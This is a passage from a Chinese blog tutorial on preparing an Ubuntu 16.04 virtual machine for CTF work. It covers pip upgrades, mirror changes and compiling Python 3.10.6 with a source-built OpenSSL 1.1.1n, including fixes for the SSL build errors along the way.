http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse----------------------------------------------------------------- <span class="token comment"># 刷新三连</span><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> upgrade<span class="token function">sudo</span> <span class="token function">apt</span> clean<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Python-配置"><a href="#Python-配置" class="headerlink" title="Python 配置"></a>Python 配置</h1><blockquote><p>注意：<br>如果要给 Ubuntu 16.04 安装新版本的 Python，尽量不要更改系统默认的 <code>python3</code> 指向，因为 Ubuntu 的一些功能依赖于 python 2.7 和 python 3.5，随意改动可能出现各种奇奇怪怪的兼容性问题</p><p><strong>另外，系统自带的 python 千万不要卸载，可能导致系统崩溃！！！</strong></p><p><em>Ubuntu 16.04 的 pip 源建议使用阿里源，否则后面使用 pip 可能会遇到 SSL 问题</em></p></blockquote><p>Ubuntu 16.04 默认：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> 无<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><mark>以上默认设置尽量不要更改</mark> <strong>（python 和 pip 的指向可以修改，但 python2、python3 尽量不要动）</strong></p><p>如果安装了新版的 Python，例如安装了 python 3.10.6，就使用 <code>python3.10</code> 来打开，同理使用 <code>pip3.10</code></p><p>即对应关系为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python2 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">2.7</span>python3 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.5</span>python3.10 <span class="token operator">==</span><span class="token operator">></span> python <span class="token number">3.10</span>pip <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip2 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">2.7</span><span class="token punctuation">)</span>pip3 <span class="token operator">==</span><span class="token operator">></span> 无pip3.10 <span class="token operator">==</span><span class="token operator">></span> pip <span class="token punctuation">(</span>python <span class="token number">3.10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="升级系统自带-pip"><a href="#升级系统自带-pip" class="headerlink" title="升级系统自带 pip"></a>升级系统自带 pip</h2><blockquote><p>由于系统自带的 python 的 pip 版本太低 （pip-8），后续操作会导致各种问题，所以最好升级一下</p><p><mark>但是注意千万不能直接使用 <code>pip3 install --upgrade pip</code> 来升级系统自带的 pip</mark></p><p>因为这会将 pip 升级为最新版，导致与 python 3.5 不匹配，因为 <strong>python 3.5 最高只支持 pip-20.3.4</strong> （python 3.5 在 2020 年 9 月后不再支持 pip-21 以后的版本）</p></blockquote><p>使用 <code>get-pip.py</code> 更新 python 3.5 自带的 pip 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/3.5/get-pip.py <span class="token parameter variable">-O</span> get-pip3.5.pypython3.5 get-pip3.5.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>同理 python 2.7：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://bootstrap.pypa.io/pip/2.7/get-pip.py <span class="token parameter variable">-O</span> get-pip2.7.pypython2.7 get-pip2.7.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果更新 pip 后使用 <code>pip -V</code> 出现警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: pip is being invoked by an old script wrapper. This will fail <span class="token keyword">in</span> a future version of pip.Please see https://github.com/pypa/pip/issues/5599 <span class="token keyword">for</span> advice on fixing the underlying issue.To avoid this problem you can invoke Python with <span class="token string">'-m pip'</span> instead of running pip directly.pip <span class="token number">20.3</span>.4 from /home/wyy/.local/lib/python3.5/site-packages/pip <span class="token punctuation">(</span>python <span class="token number">3.5</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意, PATH 的内容要与上述 WARNING 中的路径一致</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/home/wyy/.local/lib/python3.5/site-packages/pip:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><hr><h2 id="更换-pip-源"><a href="#更换-pip-源" class="headerlink" title="更换 pip 源"></a>更换 pip 源</h2><blockquote><p>Ubuntu 16.04 的 pip 源建议使用阿里源，否则后面使用 pip 可能会遇到 SSL 问题</p></blockquote><p>如果使用 <code>pip install xxx</code> 无法安装库，出现警告：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">4</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">3</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">2</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">1</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/WARNING: Retrying <span class="token punctuation">(</span>Retry<span class="token punctuation">(</span>total<span class="token operator">=</span><span class="token number">0</span>, <span class="token assign-left variable">connect</span><span class="token operator">=</span>None, <span class="token assign-left variable">read</span><span class="token operator">=</span>None, <span class="token assign-left variable">redirect</span><span class="token operator">=</span>None, <span class="token assign-left variable">status</span><span class="token operator">=</span>None<span class="token punctuation">))</span> after connection broken by <span class="token string">'SSLError(SSLEOFError(8, '</span>EOF occurred <span class="token keyword">in</span> violation of protocol <span class="token punctuation">(</span>_ssl.c:645<span class="token punctuation">)</span><span class="token string">'),)'</span><span class="token builtin class-name">:</span> /simple/pwn/Could not fetch URL https://pypi.tuna.tsinghua.edu.cn/simple/pwn/: There was a problem confirming the ssl certificate: HTTPSConnectionPool<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pypi.tuna.tsinghua.edu.cn'</span>, <span class="token assign-left variable">port</span><span class="token operator">=</span><span class="token number">443</span><span class="token punctuation">)</span>: Max retries exceeded with url: /simple/pwn/ <span class="token punctuation">(</span>Caused by SSLError<span class="token punctuation">(</span>SSLEOFError<span class="token punctuation">(</span><span class="token number">8</span>, <span class="token string">'EOF occurred in violation of protocol (_ssl.c:645)'</span><span class="token punctuation">)</span>,<span class="token punctuation">))</span> - skipping<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可尝试更换 pip 源，这通常是因为 Ubuntu 16.04 这种老版本使用清华源导致的</p><p>例如将清华源换成阿里源，更改 <code>~/.config/pip/pip.conf</code> 文件内容，示例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>global<span class="token punctuation">]</span>index-url <span class="token operator">=</span> http://mirrors.aliyun.com/pypi/simple/<span class="token punctuation">[</span>install<span class="token punctuation">]</span>trusted-host <span class="token operator">=</span> mirrors.aliyun.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="安装-python-3-10-6"><a href="#安装-python-3-10-6" class="headerlink" title="安装 python 3.10.6"></a>安装 python 3.10.6</h2><blockquote><p>由于 Ubuntu 16.04 自带的 python 3.5 太老了，pip 默认版本只有 8，是无法直接安装 pwntools 的，也会存在其他的版本问题，索性直接安装一个新一点的 python 3.10.6</p><p><em>但是安装过程也不是一帆风顺的，遇到了各种各样的 bug，下面会具体分析和解决</em></p><p><em>如果图方便和稳定，就安装 python 3.9 及以下的版本吧，试了一次好像没什么 bug （至少没有 SSL 问题）</em></p><p>参考文章：<br><a href="https://blog.csdn.net/weixin_44132990/article/details/126308573">Ubuntu安装python3.10.6-CSDN博客</a></p></blockquote><p>安装相关库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载并解压 python 3.10.6 源码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.python.org/ftp/python/3.10.6/Python-3.10.6.tgz<span class="token function">tar</span> <span class="token parameter variable">-vxf</span> Python-3.10.6.tgz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.10.6 下</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里安装使用的是 <code>sudo make altinstall</code> 而不是 <code>sudo make install</code> （当然也可以）<br>使用 <code>sudo make install</code> 可能会更改自带的 python3 安装，使卸载变得困难，甚至使自带的 python3 变得不可用，但一般不会出现这些恶性错误</p></blockquote><hr><h3 id="踩坑与解决"><a href="#踩坑与解决" class="headerlink" title="踩坑与解决"></a>踩坑与解决</h3><blockquote><p>参考文章：</p><ol><li><a href="https://blog.csdn.net/qq_39719415/article/details/121361399">python3的安装（踩坑版，解决ssl问题，解决pip3无法使用的问题）python3 安装ssl模块-CSDN博客</a></li><li><a href="https://blog.csdn.net/mdh17322249/article/details/123966953">python3.10编译安装报SSL失败解决方法_python源码编译的时候 — logging error — got an error: -CSDN博客</a></li><li><a href="https://blog.csdn.net/u011573853/article/details/107243183">The necessary bits to build these optional modules were not found: _uuid _bz2 _curse _curses_panel-CSDN博客</a></li></ol></blockquote><p>安装 python 3.10.6 在 <code>make</code> 编译的最后会报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The necessary bits to build these optional modules were not found:  _lzma                 _uuid                                      To <span class="token function">find</span> the necessary bits, <span class="token function">look</span> <span class="token keyword">in</span> setup.py <span class="token keyword">in</span> detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> the module's name.      The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have been  built by the Makefile instead, as configured by the Setup files:  _abc                  <span class="token builtin class-name">pwd</span>                   <span class="token function">time</span>                     Failed to build these modules:  _hashlib              _ssl                                           Could not build the ssl module<span class="token operator">!</span>  Python requires a OpenSSL <span class="token number">1.1</span>.1 or newer<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>原因在于 python 3.10 依赖的 OpenSSL 必须要是 1.1.1 之后的版本，或者安装了 2.6.4 之后的 libressl，linux 自带的 OpenSSL 版本过低，同时还显示缺少 <code>_lzma</code> 和 <code>_uuid</code></p><hr><h4 id="编译安装-OpenSSL-1-1-1n"><a href="#编译安装-OpenSSL-1-1-1n" class="headerlink" title="编译安装 OpenSSL 1.1.1n"></a>编译安装 <code>OpenSSL 1.1.1n</code></h4><p>下载：<a href="https://www.openssl.org/source/openssl-1.1.1n.tar.gz" title="https://www.openssl.org/source/openssl-1.1.1n.tar.gz">https://www.openssl.org/source/openssl-1.1.1n.tar.gz</a></p><p>解压并编译：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">wget</span> https://www.openssl.org/source/openssl-1.1.1n.tar.gz<span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> openssl-1.1.1n.tar.gz<span class="token builtin class-name">cd</span> openssl-1.1.1n<span class="token function">sudo</span> ./config <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/openssl<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>修改链接文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 备份原有链接</span><span class="token function">sudo</span> <span class="token function">mv</span> /usr/bin/openssl /usr/bin/openssl.bak <span class="token comment"># 创建软链接</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-sf</span> /usr/local/openssl/bin/openssl /usr/bin/openssl<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>添加路径至 <code>ld.so.conf</code>： （注意路径最后不能带 <code>&#39;/&#39;</code>，否则会报错）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">su</span>   <span class="token comment"># 先进入 root 账户，否则下面一条语句会报权限问题的错误</span><span class="token builtin class-name">echo</span> <span class="token string">"/usr/local/openssl/lib"</span> <span class="token operator">>></span> /etc/ld.so.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看设置是否生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ldconfig <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看 OpenSSL 版本：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl version<span class="token comment"># 输出：</span>OpenSSL <span class="token number">1.1</span>.1n  <span class="token number">15</span> Mar <span class="token number">2022</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>修改 python 3.10.6 编译源文件的 <code>Setup</code> 中的链接，路径位于：<code>Python-3.10.6/Modules/Setup</code></p><p>在 <code>Setup</code> 中找到如下位置，可直接搜索 <code>&#39;OPENSSL&#39;</code> （大概位于第 211 行）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Socket module helper for SSL support; you must comment out the other</span><span class="token comment"># socket line above, and edit the OPENSSL variable:</span> <span class="token assign-left variable">OPENSSL</span><span class="token operator">=</span>/usr/local/openssl _ssl _ssl.c <span class="token punctuation">\</span>     -I<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/include -L<span class="token variable"><span class="token variable">$(</span>OPENSSL<span class="token variable">)</span></span>/lib <span class="token punctuation">\</span>     <span class="token parameter variable">-lssl</span> <span class="token parameter variable">-lcrypto</span><span class="token comment">#_hashlib _hashopenssl.c \</span><span class="token comment">#     -I$(OPENSSL)/include -L$(OPENSSL)/lib \</span><span class="token comment">#     -lcrypto</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>将中间这四句取消注释，并<strong>将 OpenSSL 的安装路径填入 <code>OPENSSL=</code> 后面</strong> <em>（其他地方都不需要改动，可能 Setup 的内容有些区别，以自己的为主）</em>：</p><p>保存 <code>Setup</code> 文件</p><hr><h4 id="安装-lzma-和-uuid"><a href="#安装-lzma-和-uuid" class="headerlink" title="安装 _lzma 和 _uuid"></a>安装 <code>_lzma</code> 和 <code>_uuid</code></h4><p>直接一次性安装全部：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h4 id="再次编译安装-python"><a href="#再次编译安装-python" class="headerlink" title="再次编译安装 python"></a>再次编译安装 python</h4><p>最后，重新编译安装 python 3.10.6：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> Python-3.10.6<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.10.6 下</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.10.6 --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此时 <code>make</code> 编译最后显示：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The following modules found by detect_modules<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">in</span> setup.py, have beenbuilt by the Makefile instead, as configured by the Setup files:_abc                  _ssl                  <span class="token builtin class-name">pwd</span>                <span class="token function">time</span>                                                           Failed to build these modules:_hashlib  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>_hashlib</code> 是 OpenSSL 用于支持哈希加密的模块之一，由于我们手动编译安装了 <code>OpenSSL 1.1.1n</code>，忽略即可</p><p>安装完后，终端输入 <code>python3.10</code> 即可打开 python3.10.6 的界面</p><p>pip3 也会自动安装好：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA8.png" alt="Linux虚拟机CTF环境搭建8.png"></p><p>如果出现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: The script pip3.10 is installed <span class="token keyword">in</span> <span class="token string">'/usr/local/python3.10.6/bin'</span> <span class="token function">which</span> is not on <span class="token environment constant">PATH</span><span class="token builtin class-name">.</span>Consider adding this directory to <span class="token environment constant">PATH</span> or, <span class="token keyword">if</span> you prefer to suppress this warning, use --no-warn-script-location.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解决办法：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 注意, PATH 的内容要与上述 WARNING 中的路径一致</span><span class="token builtin class-name">echo</span> <span class="token string">'export PATH=/usr/local/python3.10.6/bin:$PATH'</span> <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>验证安装：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA9.png" alt="Linux虚拟机CTF环境搭建9.png"></p><p>查看安装路径：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA13.png" alt="Linux虚拟机CTF环境搭建13.png"></p><p>防止后续安装 Pwntools 时发生报错，还需要在 <code>/usr/local/python3.10.6</code>（以自己实际安装路径为主）下建立一个 pip 的软连接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/local/python3.10.6/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>同时，此时 <code>python3.10</code> 和 <code>pip3.10</code> 是不可以在 <code>sudo</code> 下运行的，加入软链接：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python3.10<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip3.10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>到此，大功告成！完美！</p><hr><h3 id="设置默认-python-和-pip-版本"><a href="#设置默认-python-和-pip-版本" class="headerlink" title="设置默认 python 和 pip 版本"></a>设置默认 python 和 pip 版本</h3><p>设置默认 python 版本为 python 3.10.6，默认 pip 版本为 pip-22.2.1 （python 3.10.6）</p><ol><li>通过修改软连接：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 删除原有的软链接</span><span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/python<span class="token function">sudo</span> <span class="token function">rm</span> /usr/bin/pip<span class="token comment"># 设置软连接</span><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/python3.10 /usr/bin/python<span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.10.6/bin/pip3.10 /usr/bin/pip<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>通过更改 <code>.bashrc</code>：</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">python</span><span class="token operator">=</span>python3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">echo</span> <span class="token builtin class-name">alias</span> <span class="token assign-left variable">pip</span><span class="token operator">=</span>pip3.10 <span class="token operator">>></span> ~/.bashrc<span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>提示：</strong><br><strong>尽量不要更改 python3 的默认版本，python3 默认指向 python 3.5，因为 Ubuntu 16.04 某些设置可能会用到 python 3.5，更改可能会出现各种奇奇怪怪的问题</strong></p><blockquote><p>注意：<code>/usr/local/python3.10.6</code> 这个地址是安装后 python 3.10.6 的路径，视自己的情况而定 </p><p>python 3.10.6 的路径可以通过 <code>which python3.10</code> 来查看</p></blockquote><hr><h2 id="安装-python-3-9-及以下版本"><a href="#安装-python-3-9-及以下版本" class="headerlink" title="安装 python 3.9 及以下版本"></a>安装 python 3.9 及以下版本</h2><blockquote><p>以 python 3.9.13 为例，这个版本就没有 python 3.10 那么麻烦了</p></blockquote><p>安装相关库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> update<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libffi-dev build-essential python-dev python-setuptools python-pip python-smbus build-essential libncursesw5-dev libgdbm-dev libc6-dev zlib1g-dev libsqlite3-dev tk-dev libssl-dev openssl libxpm-dev libxext-dev zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>安装依赖：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> build-essential zlib1g-dev libncurses5-dev libgdbm-dev libnss3-dev libssl-dev libreadline-dev libffi-dev <span class="token function">wget</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> uuid-dev libbz2-dev libncurses5-dev libgdbm-dev liblzma-dev sqlite3 libsqlite3-dev openssl libssl-dev tcl8.6-dev tk8.6-dev libreadline-dev zlib1g-dev libffi-dev<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>下载：<a href="https://www.python.org/ftp/python/3.9.13/Python-3.9.13.tgz">Python Release Python 3.9.13 | Python.org</a></p><p>解压并编译安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> Python-3.9.13.tgz<span class="token builtin class-name">cd</span> Python-3.9.13<span class="token comment"># --prefix 指定安装的目录，我这里安装在 /usr/local/python3.9 下</span><span class="token comment"># --with-pydebug 添加调试工具</span><span class="token comment"># --enable-optimizations 对编译结果进行优化，提高运行效率</span><span class="token function">sudo</span> ./configure <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/usr/local/python3.9 --with-pydebug --enable-optimizations<span class="token function">sudo</span> <span class="token function">make</span><span class="token function">sudo</span> <span class="token function">make</span> altinstall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>配置 python 3.9.13 和 pip 3.9：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/python3.9  /usr/bin/python3.9$ <span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> /usr/local/python3.9/bin/pip3.9  /usr/bin/pip3.9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果出现：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">The directory <span class="token string">'/home/wyy/.cache/pip/http'</span> or its parent directory is not owned by the current user and the cache has been disabled. Please check the permissions and owner of that directory. If executing pip with sudo, you may want <span class="token function">sudo</span><span class="token string">'s -H flag.The directory '</span>/home/wyy/.cache/pip<span class="token string">' or its parent directory is not owned by the current user and caching wheels has been disabled. check the permissions and owner of that directory. If executing pip with sudo, you may want sudo'</span>s <span class="token parameter variable">-H</span> flag.<span aria-hidden="true" 